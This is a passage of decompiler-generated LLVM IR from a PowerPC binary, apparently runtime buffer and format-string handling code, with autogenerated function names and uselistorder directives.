  %v3_10006764 = icmp eq i8 %v2_10006760, 0
  br i1 %v3_10006764, label %dec_label_pc_1000676c, label %dec_label_pc_10006784

dec_label_pc_1000676c:                            ; preds = %dec_label_pc_1000671c
  %v0_1000676c = load i32, i32* @r30, align 4
  %v1_1000676c = inttoptr i32 %v0_1000676c to i8*
  %v2_1000676c = load i8, i8* %v1_1000676c, align 1
  %v3_1000676c = zext i8 %v2_1000676c to i32
  store i32 %v3_1000676c, i32* %r0.global-to-local, align 4
  %v3_10006770 = icmp eq i8 %v2_1000676c, 109
  br i1 %v3_10006770, label %dec_label_pc_10006778, label %dec_label_pc_100068bc

dec_label_pc_10006778:                            ; preds = %dec_label_pc_1000676c
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000677c = load i32, i32* @r28, align 4
  %v2_1000677c = add i32 %v1_1000677c, 28
  %v3_1000677c = inttoptr i32 %v2_1000677c to i32*
  store i32 %v3_10006760, i32* %v3_1000677c, align 4
  %v0_10006780 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006780 = load i32, i32* @r28, align 4
  %v2_10006780 = add i32 %v1_10006780, 32
  %v3_10006780 = inttoptr i32 %v2_10006780 to i32*
  store i32 %v0_10006780, i32* %v3_10006780, align 4
  br label %dec_label_pc_10006784

dec_label_pc_10006784:                            ; preds = %dec_label_pc_1000671c, %dec_label_pc_10006778
  %v0_10006784 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10006784, 1
  br i1 %tmp62, label %dec_label_pc_10006860, label %dec_label_pc_1000678c

dec_label_pc_1000678c:                            ; preds = %dec_label_pc_10006784
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10006790

dec_label_pc_10006790:                            ; preds = %dec_label_pc_10006848, %dec_label_pc_1000678c
  %v0_100067b8 = phi i32 [ 0, %dec_label_pc_1000678c ], [ %v1_1000684c, %dec_label_pc_10006848 ]
  %v2_10006790 = icmp sgt i32 %v0_100067b8, 2
  br i1 %v2_10006790, label %dec_label_pc_100067b4, label %dec_label_pc_10006798

dec_label_pc_10006798:                            ; preds = %dec_label_pc_10006790
  %v1_10006798 = mul i32 %v0_100067b8, 4
  store i32 %v1_10006798, i32* %r0.global-to-local, align 4
  %v0_1000679c = load i32, i32* @r1, align 4
  %v2_1000679c = add i32 %v0_1000679c, %v1_10006798
  store i32 %v2_1000679c, i32* %r9.global-to-local, align 4
  %v1_100067a0 = add i32 %v2_1000679c, 20
  %v2_100067a0 = inttoptr i32 %v1_100067a0 to i32*
  %v3_100067a0 = load i32, i32* %v2_100067a0, align 4
  store i32 %v3_100067a0, i32* %r0.global-to-local, align 4
  %v1_100067a4 = load i32, i32* @r28, align 4
  %v2_100067a4 = add i32 %v1_100067a4, %v0_100067b8
  store i32 %v2_100067a4, i32* %r9.global-to-local, align 4
  %v1_100067a8 = urem i32 %v3_100067a0, 256
  store i32 %v1_100067a8, i32* %r11.global-to-local, align 4
  %v1_100067ac = trunc i32 %v3_100067a0 to i8
  %v3_100067ac = add i32 %v2_100067a4, 36
  %v4_100067ac = inttoptr i32 %v3_100067ac to i8*
  store i8 %v1_100067ac, i8* %v4_100067ac, align 1
  %v0_100067c0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100067c0

dec_label_pc_100067b4:                            ; preds = %dec_label_pc_10006790
  %v2_100067b8 = add i32 %v0_100067b8, %stack_var_-84.3
  store i32 %v2_100067b8, i32* %r9.global-to-local, align 4
  %v1_100067bc = add i32 %v2_100067b8, -2
  store i32 %v1_100067bc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100067c0

dec_label_pc_100067c0:                            ; preds = %dec_label_pc_10006798, %dec_label_pc_100067b4
  %v0_100067e0 = phi i32 [ %v0_100067c0.pre, %dec_label_pc_10006798 ], [ %v1_100067bc, %dec_label_pc_100067b4 ]
  %v1_100067c0 = load i32, i32* @r26, align 4
  %v3_100067c0 = icmp sgt i32 %v0_100067e0, %v1_100067c0
  br i1 %v3_100067c0, label %dec_label_pc_100067c8, label %dec_label_pc_100067d4

dec_label_pc_100067c8:                            ; preds = %dec_label_pc_100067c0
  %v2_100067c8 = icmp sgt i32 %v0_100067e0, 9
  br i1 %v2_100067c8, label %dec_label_pc_100068bc, label %dec_label_pc_100067d0

dec_label_pc_100067d0:                            ; preds = %dec_label_pc_100067c8
  store i32 %v0_100067e0, i32* @r26, align 4
  br label %dec_label_pc_100067d4

dec_label_pc_100067d4:                            ; preds = %dec_label_pc_100067c0, %dec_label_pc_100067d0
  store i32 %v2_10006470.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100067d8 = load i32, i32* @r27, align 4
  %v1_100067d8 = mul i32 %v0_100067d8, 4
  store i32 %v1_100067d8, i32* %r0.global-to-local, align 4
  %v2_100067dc = add i32 %v1_100067d8, %v2_10006470.pre-phi
  %v3_100067dc = inttoptr i32 %v2_100067dc to i32*
  %v4_100067dc = load i32, i32* %v3_100067dc, align 4
  store i32 %v4_100067dc, i32* @r31, align 4
  %v1_100067e0 = add i32 %v0_100067e0, -1
  store i32 %v1_100067e0, i32* @r25, align 4
  %v1_100067e4 = mul i32 %v1_100067e0, 4
  %v1_100067e8 = load i32, i32* @r28, align 4
  %v2_100067e8 = add i32 %v1_100067e8, %v1_100067e4
  store i32 %v2_100067e8, i32* %r9.global-to-local, align 4
  %v3_100067ec = icmp eq i32 %v4_100067dc, 8
  %v1_100067f0 = add i32 %v2_100067e8, 40
  %v2_100067f0 = inttoptr i32 %v1_100067f0 to i32*
  %v3_100067f0 = load i32, i32* %v2_100067f0, align 4
  store i32 %v3_100067f0, i32* %r3.global-to-local, align 4
  br i1 %v3_100067ec, label %dec_label_pc_10006848, label %dec_label_pc_100067f8

dec_label_pc_100067f8:                            ; preds = %dec_label_pc_100067d4
  %v3_100067f8 = icmp eq i32 %v3_100067f0, 8
  br i1 %v3_100067f8, label %dec_label_pc_10006830, label %dec_label_pc_10006800

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067f8
  %v4_10006800 = icmp eq i32 %v3_100067f0, %v4_100067dc
  br i1 %v4_10006800, label %dec_label_pc_10006830, label %dec_label_pc_10006808

dec_label_pc_10006808:                            ; preds = %dec_label_pc_10006800
  %v1_10006808 = call i32 @function_10006378(i32 %v3_100067f0)
  store i32 %v1_10006808, i32* @r29, align 4
  %v0_10006810 = load i32, i32* @r31, align 4
  store i32 %v0_10006810, i32* %r3.global-to-local, align 4
  %v1_10006814 = call i32 @function_10006378(i32 %v0_10006810)
  store i32 %v1_10006814, i32* %r3.global-to-local, align 4
  %v0_10006820 = call i32 @__asm_mfcr()
  store i32 %v0_10006820, i32* %r3.global-to-local, align 4
  store i32 %v0_10006820, i32* %r0.global-to-local, align 4
  %v1_10006824 = call i32 @__asm_rlwinm(i32 %v0_10006820, i32 31, i32 31, i32 31)
  store i32 %v1_10006824, i32* %r0.global-to-local, align 4
  %v3_10006828 = icmp eq i32 %v1_10006824, 0
  br i1 %v3_10006828, label %dec_label_pc_10006848, label %dec_label_pc_10006808.dec_label_pc_10006830_crit_edge

dec_label_pc_10006808.dec_label_pc_10006830_crit_edge: ; preds = %dec_label_pc_10006808
  %v0_10006834.pre = load i32, i32* @r27, align 4
  %v0_1000683c.pre = load i32, i32* @r25, align 4
  %v1_10006840.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006830

dec_label_pc_10006830:                            ; preds = %dec_label_pc_10006808.dec_label_pc_10006830_crit_edge, %dec_label_pc_10006800, %dec_label_pc_100067f8
  %v1_10006840 = phi i32 [ %v1_10006840.pre, %dec_label_pc_10006808.dec_label_pc_10006830_crit_edge ], [ %v1_100067e8, %dec_label_pc_10006800 ], [ %v1_100067e8, %dec_label_pc_100067f8 ]
  %v0_1000683c = phi i32 [ %v0_1000683c.pre, %dec_label_pc_10006808.dec_label_pc_10006830_crit_edge ], [ %v1_100067e0, %dec_label_pc_10006800 ], [ %v1_100067e0, %dec_label_pc_100067f8 ]
  %v0_10006834 = phi i32 [ %v0_10006834.pre, %dec_label_pc_10006808.dec_label_pc_10006830_crit_edge ], [ %v0_100067d8, %dec_label_pc_10006800 ], [ %v0_100067d8, %dec_label_pc_100067f8 ]
  store i32 %v2_10006470.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10006834 = mul i32 %v0_10006834, 4
  store i32 %v1_10006834, i32* %r0.global-to-local, align 4
  %v2_10006838 = add i32 %v1_10006834, %v2_10006470.pre-phi
  %v3_10006838 = inttoptr i32 %v2_10006838 to i32*
  %v4_10006838 = load i32, i32* %v3_10006838, align 4
  store i32 %v4_10006838, i32* %r0.global-to-local, align 4
  %v1_1000683c = mul i32 %v0_1000683c, 4
  %v2_10006840 = add i32 %v1_1000683c, %v1_10006840
  store i32 %v2_10006840, i32* %r9.global-to-local, align 4
  %v2_10006844 = add i32 %v2_10006840, 40
  %v3_10006844 = inttoptr i32 %v2_10006844 to i32*
  store i32 %v4_10006838, i32* %v3_10006844, align 4
  br label %dec_label_pc_10006848

dec_label_pc_10006848:                            ; preds = %dec_label_pc_10006808, %dec_label_pc_100067d4, %dec_label_pc_10006830
  %v0_10006848 = load i32, i32* @r28, align 4
  %v1_10006848 = add i32 %v0_10006848, 28
  %v2_10006848 = inttoptr i32 %v1_10006848 to i32*
  %v3_10006848 = load i32, i32* %v2_10006848, align 4
  %v0_1000684c = load i32, i32* @r27, align 4
  %v1_1000684c = add i32 %v0_1000684c, 1
  store i32 %v1_1000684c, i32* @r27, align 4
  %v1_10006850 = add i32 %v3_10006848, 2
  store i32 %v1_10006850, i32* %r9.global-to-local, align 4
  %v2_10006854 = icmp slt i32 %v1_1000684c, %v1_10006850
  br i1 %v2_10006854, label %dec_label_pc_10006790, label %dec_label_pc_10006878

dec_label_pc_10006860:                            ; preds = %dec_label_pc_10006784
  %v0_10006860 = load i32, i32* @r28, align 4
  %v1_10006860 = add i32 %v0_10006860, 28
  %v2_10006860 = inttoptr i32 %v1_10006860 to i32*
  %v3_10006860 = load i32, i32* %v2_10006860, align 4
  store i32 %v3_10006860, i32* %r5.global-to-local, align 4
  %v1_10006864 = add i32 %v0_10006860, 40
  store i32 %v1_10006864, i32* @r3, align 4
  %v0_10006868 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006868 = trunc i32 %v0_10006868 to i8
  %v3_10006868 = add i32 %v0_10006860, 38
  %v4_10006868 = inttoptr i32 %v3_10006868 to i8*
  store i8 %v1_10006868, i8* %v4_10006868, align 1
  %v2_1000686c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000686c, i32* @r4, align 4
  %v0_10006870 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006870 = mul i32 %v0_10006870, 4
  store i32 %v1_10006870, i32* @r5, align 4
  store i32 268462200, i32* @lr, align 4
  %v0_10006874 = call i32 @function_10007104()
  store i32 %v0_10006874, i32* %r3.global-to-local, align 4
  %v0_10006878.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006878

dec_label_pc_10006878:                            ; preds = %dec_label_pc_10006848, %dec_label_pc_10006860
  %v0_10006878 = phi i32 [ %v0_10006878.pre, %dec_label_pc_10006860 ], [ %v0_10006848, %dec_label_pc_10006848 ]
  %v1_10006878 = add i32 %v0_10006878, 16
  %v2_10006878 = inttoptr i32 %v1_10006878 to i32*
  %v3_10006878 = load i32, i32* %v2_10006878, align 4
  store i32 %v3_10006878, i32* %r0.global-to-local, align 4
  %v0_1000687c = load i32, i32* @r26, align 4
  %v2_1000687c = add i32 %v0_10006878, 24
  %v3_1000687c = inttoptr i32 %v2_1000687c to i32*
  store i32 %v0_1000687c, i32* %v3_1000687c, align 4
  %v0_10006880 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006880 = and i32 %v0_10006880, 128
  store i32 %v1_10006880, i32* %r9.global-to-local, align 4
  %v3_10006880 = icmp eq i32 %v1_10006880, 0
  br i1 %v3_10006880, label %dec_label_pc_10006888, label %dec_label_pc_10006894

dec_label_pc_10006888:                            ; preds = %dec_label_pc_10006878
  %v0_10006888 = load i32, i32* @r30, align 4
  %v1_10006888 = add i32 %v0_10006888, 1
  store i32 %v1_10006888, i32* %r0.global-to-local, align 4
  %v1_1000688c = load i32, i32* @r28, align 4
  %v2_1000688c = inttoptr i32 %v1_1000688c to i32*
  store i32 %v1_10006888, i32* %v2_1000688c, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_10006894:                            ; preds = %dec_label_pc_10006878
  %v0_10006894 = load i32, i32* @r28, align 4
  %v1_10006894 = inttoptr i32 %v0_10006894 to i32*
  %v2_10006894 = load i32, i32* %v1_10006894, align 4
  %v2_10006898 = ptrtoint i32* %stack_var_-80 to i32
  %v1_1000689c = load i32, i32* @r30, align 4
  %v2_1000689c = sub i32 %v1_1000689c, %v2_10006898
  %v1_100068a0 = mul i32 %v2_1000689c, 4
  store i32 %v1_100068a0, i32* %r0.global-to-local, align 4
  %v2_100068a4 = add i32 %v1_100068a0, %v2_10006894
  store i32 %v2_100068a4, i32* %r9.global-to-local, align 4
  store i32 %v2_100068a4, i32* %v1_10006894, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_10006888, %dec_label_pc_10006894
  %v0_100068ac = load i32, i32* @r28, align 4
  %v1_100068ac = add i32 %v0_100068ac, 28
  %v2_100068ac = inttoptr i32 %v1_100068ac to i32*
  %v3_100068ac = load i32, i32* %v2_100068ac, align 4
  store i32 %v3_100068ac, i32* %r9.global-to-local, align 4
  %v1_100068b0 = add i32 %v3_100068ac, 2
  br label %dec_label_pc_100068bc

dec_label_pc_100068bc:                            ; preds = %dec_label_pc_10006420, %dec_label_pc_100064f4, %dec_label_pc_100065d0, %dec_label_pc_100065c4, %dec_label_pc_100065ec, %dec_label_pc_10006528, %dec_label_pc_100067c8, %dec_label_pc_10006678, %dec_label_pc_1000676c, %dec_label_pc_100068ac
  %storemerge2 = phi i32 [ %v1_100068b0, %dec_label_pc_100068ac ], [ -1, %dec_label_pc_1000676c ], [ -1, %dec_label_pc_10006678 ], [ -1, %dec_label_pc_100067c8 ], [ -1, %dec_label_pc_10006528 ], [ -1, %dec_label_pc_100065ec ], [ -1, %dec_label_pc_100065c4 ], [ -1, %dec_label_pc_100065d0 ], [ -1, %dec_label_pc_100064f4 ], [ -1, %dec_label_pc_10006420 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100063bc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100068a0, { 1, 0 }
  uselistorder i32 %v0_10006878, { 1, 0 }
  uselistorder i32 %v1_1000684c, { 1, 2, 0 }
  uselistorder i32 %v1_10006834, { 1, 0 }
  uselistorder i32 %v0_10006820, { 0, 2, 1 }
  uselistorder i32 %v3_100067f0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100067e8, { 1, 2, 0 }
  uselistorder i32 %v1_100067e0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100067d8, { 1, 0 }
  uselistorder i32 %v0_100067d8, { 1, 2, 0 }
  uselistorder i32 %v3_100067a0, { 1, 0, 2 }
  uselistorder i32 %v1_10006798, { 1, 0 }
  uselistorder i32 %v0_100067b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10006710, { 1, 2, 0 }
  uselistorder i32 %v1_100066e8, { 2, 1, 0 }
  uselistorder i32 %v1_100066d4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100066b8, { 1, 0, 2 }
  uselistorder i32 %v1_10006684, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006640, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10006604, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100065f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10006560, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000655c, { 1, 0 }
  uselistorder i32 %v0_10006574, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100064d8, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100064c8, { 1, 0 }
  uselistorder i32 %v1_100064c4, { 1, 0 }
  uselistorder i32 %v3_100064b8, { 1, 0, 2 }
  uselistorder i32 %v0_10006534, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10006504, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_10006494, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000647c, { 1, 0 }
  uselistorder i32 %v2_10006470.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10006450, { 1, 0 }
  uselistorder i32 %v1_10006438, { 1, 2, 0 }
  uselistorder i32 %v0_1000642c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 33, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10 }
  uselistorder i32* %r0.global-to-local, { 42, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @function_10006378, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000e5f4.245 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100068bc, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100068ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006878, { 1, 0 }
  uselistorder label %dec_label_pc_10006848, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100067d4, { 1, 0 }
  uselistorder label %dec_label_pc_100067c0, { 1, 0 }
  uselistorder label %dec_label_pc_10006784, { 1, 0 }
  uselistorder label %dec_label_pc_100066cc, { 1, 0 }
  uselistorder label %dec_label_pc_10006678, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006628, { 1, 0 }
  uselistorder label %dec_label_pc_100065fc, { 1, 0 }
  uselistorder label %dec_label_pc_100065b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100065ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006520, { 1, 0 }
  uselistorder label %dec_label_pc_10006518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100064b8, { 1, 0 }
  uselistorder label %dec_label_pc_100064b4, { 1, 0 }
  uselistorder label %dec_label_pc_100064a0, { 1, 0 }
  uselistorder label %dec_label_pc_10006480, { 1, 0 }
  uselistorder label %dec_label_pc_1000647c, { 1, 0 }
  uselistorder label %dec_label_pc_10006460, { 1, 0 }
}

define i32 @function_100068d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100068d0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100068d8 = call i32 @__asm_mfcr()
  store i32 %v0_100068d8, i32* %r31.global-to-local, align 4
  %v2_100068fc = add i32 %v0_100068d8, 52
  %v3_100068fc = inttoptr i32 %v2_100068fc to i32*
  %v4_100068fc = load i32, i32* %v3_100068fc, align 4
  %v2_10006900 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006900, i32* @r3, align 4
  %v3_10006904 = icmp eq i32 %v4_100068fc, 0
  store i1 %v3_10006904, i1* @cr4_eq, align 1
  br i1 %v3_10006904, label %dec_label_pc_10006918, label %dec_label_pc_10006918.thread

dec_label_pc_10006918.thread:                     ; preds = %dec_label_pc_100068d0
  %v1_100069203 = inttoptr i32 %v0_100068d8 to i16*
  %v2_100069204 = load i16, i16* %v1_100069203, align 2
  %v3_100069205 = zext i16 %v2_100069204 to i32
  store i32 %v3_100069205, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000692c

dec_label_pc_10006918:                            ; preds = %dec_label_pc_100068d0
  %v0_1000690c = call i32 @function_100091fc()
  %v0_10006914 = call i32 @function_100091f4()
  %v0_10006920.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006924.pre = load i1, i1* @cr4_eq, align 1
  store i32 %v2_10006900, i32* @r3, align 4
  %v1_10006920 = inttoptr i32 %v0_10006920.pre to i16*
  %v2_10006920 = load i16, i16* %v1_10006920, align 2
  %v3_10006920 = zext i16 %v2_10006920 to i32
  store i32 %v3_10006920, i32* %r31.global-to-local, align 4
  br i1 %v0_10006924.pre, label %dec_label_pc_10006928, label %dec_label_pc_1000692c

dec_label_pc_10006928:                            ; preds = %dec_label_pc_10006918
  %v0_10006928 = call i32 @function_100091fc()
  br label %dec_label_pc_1000692c

dec_label_pc_1000692c:                            ; preds = %dec_label_pc_10006918.thread, %dec_label_pc_10006918, %dec_label_pc_10006928
  %v3_100069206 = phi i32 [ %v3_100069205, %dec_label_pc_10006918.thread ], [ %v3_10006920, %dec_label_pc_10006918 ], [ %v3_10006920, %dec_label_pc_10006928 ]
  %v1_10006930 = call i32 @__asm_rlwinm(i32 %v3_100069206, i32 0, i32 29, i32 29)
  %v1_10006944 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100068d8)
  ret i32 %v1_10006930

; uselistorder directives
  uselistorder i32 %v0_100068d8, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000692c, { 2, 1, 0 }
}

define i32 @function_1000694c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000694c:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006954 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10006954, i32* %r28.global-to-local, align 4
  %v2_1000697c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000697c, i32* @r3, align 4
  %v1_10006980 = add i32 %arg3, 52
  %v2_10006980 = inttoptr i32 %v1_10006980 to i32*
  %v3_10006980 = load i32, i32* %v2_10006980, align 4
  %v3_10006988 = icmp eq i32 %v3_10006980, 0
  store i1 %v3_10006988, i1* @cr4_eq, align 1
  br i1 %v3_10006988, label %dec_label_pc_10006990, label %dec_label_pc_1000699c

dec_label_pc_10006990:                            ; preds = %dec_label_pc_1000694c
  %v0_10006990 = call i32 @function_100091fc()
  %v0_10006998 = call i32 @function_100091f4()
  %v0_1000699c.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100069a0.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100069a4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000699c

dec_label_pc_1000699c:                            ; preds = %dec_label_pc_1000694c, %dec_label_pc_10006990
  %v0_100069a4 = phi i32 [ %v0_10006954, %dec_label_pc_1000694c ], [ %v0_100069a4.pre, %dec_label_pc_10006990 ]
  %v0_100069a0 = phi i32 [ %arg3, %dec_label_pc_1000694c ], [ %v0_100069a0.pre, %dec_label_pc_10006990 ]
  %v0_1000699c = phi i32 [ %arg2, %dec_label_pc_1000694c ], [ %v0_1000699c.pre, %dec_label_pc_10006990 ]
  store i32 268462508, i32* @lr, align 4
  %v3_100069a8 = inttoptr i32 %v0_100069a4 to i8*
  %v4_100069a8 = call i32 @function_10006e08(i8* %v3_100069a8, i32 %v0_1000699c, i32 %v0_100069a0)
  store i32 %v4_100069a8, i32* @r31, align 4
  store i32 %v2_1000697c, i32* @r3, align 4
  %v0_100069b8 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100069b8, label %dec_label_pc_100069bc, label %dec_label_pc_100069c0

dec_label_pc_100069bc:                            ; preds = %dec_label_pc_1000699c
  %v0_100069bc = call i32 @function_100091fc()
  %v0_100069c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100069c0

dec_label_pc_100069c0:                            ; preds = %dec_label_pc_1000699c, %dec_label_pc_100069bc
  %v0_100069c4 = phi i32 [ %v4_100069a8, %dec_label_pc_1000699c ], [ %v0_100069c4.pre, %dec_label_pc_100069bc ]
  %v1_100069d8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006954)
  ret i32 %v0_100069c4

; uselistorder directives
  uselistorder i32 %v0_10006954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100069c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000699c, { 1, 0 }
}

define i32 @function_100069e0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100069e0:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_100069ec = add i32 %arg2, 56
  store i32 %v1_100069ec, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v1_10006a00 = add i32 %arg2, 52
  %v2_10006a00 = inttoptr i32 %v1_10006a00 to i32*
  %v3_10006a00 = load i32, i32* %v2_10006a00, align 4
  %v3_10006a04 = icmp eq i32 %v3_10006a00, 0
  br i1 %v3_10006a04, label %dec_label_pc_10006a3c, label %dec_label_pc_10006a0c

dec_label_pc_10006a0c:                            ; preds = %dec_label_pc_100069e0
  %v1_10006a0c = add i32 %arg2, 16
  %v2_10006a0c = inttoptr i32 %v1_10006a0c to i32*
  %v3_10006a0c = load i32, i32* %v2_10006a0c, align 4
  %v1_10006a101 = zext i8 %arg1 to i32
  store i32 %v1_10006a101, i32* %r30.global-to-local, align 4
  %v1_10006a14 = add i32 %arg2, 28
  %v2_10006a14 = inttoptr i32 %v1_10006a14 to i32*
  %v3_10006a14 = load i32, i32* %v2_10006a14, align 4
  %v2_10006a18 = add i32 %v3_10006a0c, 1
  store i32 %v2_10006a18, i32* %r11.global-to-local, align 4
  %v3_10006a1c = icmp ult i32 %v3_10006a0c, %v3_10006a14
  br i1 %v3_10006a1c, label %dec_label_pc_10006a24, label %dec_label_pc_10006a30

dec_label_pc_10006a24:                            ; preds = %dec_label_pc_10006a0c
  %v4_10006a0c = inttoptr i32 %v3_10006a0c to i8*
  store i8 %arg1, i8* %v4_10006a0c, align 1
  %v0_10006a28 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10006a28, i32* %v2_10006a0c, align 4
  br label %dec_label_pc_10006a94

dec_label_pc_10006a30:                            ; preds = %dec_label_pc_10006a0c
  store i32 268462644, i32* @lr, align 4
  %v4_10006a30 = trunc i32 %v1_100069ec to i8
  %v5_10006a30 = call i32 @function_10006ecc(i8 %v4_10006a30, i32 %v3_10006a0c, i32 %v1_100069ec)
  store i32 %v5_10006a30, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006a94

dec_label_pc_10006a3c:                            ; preds = %dec_label_pc_100069e0
  %v2_10006a40 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006a40, i32* @r3, align 4
  %v0_10006a48 = call i32 @function_100091fc()
  %v0_10006a50 = call i32 @function_100091f4()
  %v0_10006a54 = load i32, i32* @r31, align 4
  %v1_10006a54 = add i32 %v0_10006a54, 16
  %v2_10006a54 = inttoptr i32 %v1_10006a54 to i32*
  %v3_10006a54 = load i32, i32* %v2_10006a54, align 4
  %v1_10006a58 = add i32 %v0_10006a54, 28
  %v2_10006a58 = inttoptr i32 %v1_10006a58 to i32*
  %v3_10006a58 = load i32, i32* %v2_10006a58, align 4
  %v0_10006a60 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006a60 = urem i32 %v0_10006a60, 256
  store i32 %v1_10006a60, i32* %r30.global-to-local, align 4
  %v2_10006a68 = add i32 %v3_10006a54, 1
  store i32 %v2_10006a68, i32* %r11.global-to-local, align 4
  %v3_10006a6c = icmp ult i32 %v3_10006a54, %v3_10006a58
  br i1 %v3_10006a6c, label %dec_label_pc_10006a74, label %dec_label_pc_10006a80

dec_label_pc_10006a74:                            ; preds = %dec_label_pc_10006a3c
  %v4_10006a54 = inttoptr i32 %v3_10006a54 to i8*
  %v1_10006a74 = trunc i32 %v0_10006a60 to i8
  store i8 %v1_10006a74, i8* %v4_10006a54, align 1
  %v0_10006a78 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006a78 = load i32, i32* @r31, align 4
  %v2_10006a78 = add i32 %v1_10006a78, 16
  %v3_10006a78 = inttoptr i32 %v2_10006a78 to i32*
  store i32 %v0_10006a78, i32* %v3_10006a78, align 4
  br label %dec_label_pc_10006a88

